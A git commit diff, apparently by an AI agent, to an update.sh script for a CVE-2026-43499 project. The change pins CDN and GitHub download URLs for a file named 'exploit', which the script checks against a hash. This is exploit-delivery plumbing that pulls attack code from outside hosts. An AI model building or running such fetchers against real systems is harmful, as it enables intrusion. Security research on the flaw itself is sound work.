da1b421c5eaf8a262bb0b24b5629e0ad5ffb089f
doubao-agent <doubao-agent@local>
2026-09-10 14:06:45 +0800

    update.sh: 引用 v3.1

--- cve_2026_43499/update.sh
+++ cve_2026_43499/update.sh
@@ -12,8 +12,8 @@ EXP_HASH="6b0c96b7b92cb67c6d0c5209febbbb3aaad2e1702d858bc6919d4753536a0762"
 # 2. github.com raw 路径 (不走 raw.githubusercontent.com)
 # 3. raw.githubusercontent.com (直连, 有时可达)
 CHANNELS='
-https://cdn.jsdelivr.net/gh/1332915/-10e-@__C__/cve_2026_43499/exploit
-https://github.com/1332915/-10e-/raw/__C__/cve_2026_43499/exploit
+https://cdn.jsdelivr.net/gh/1332915/-10e-@d886b76/cve_2026_43499/exploit
+https://github.com/1332915/-10e-/raw/d886b76/cve_2026_43499/exploit
 https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/exploit
 '
 
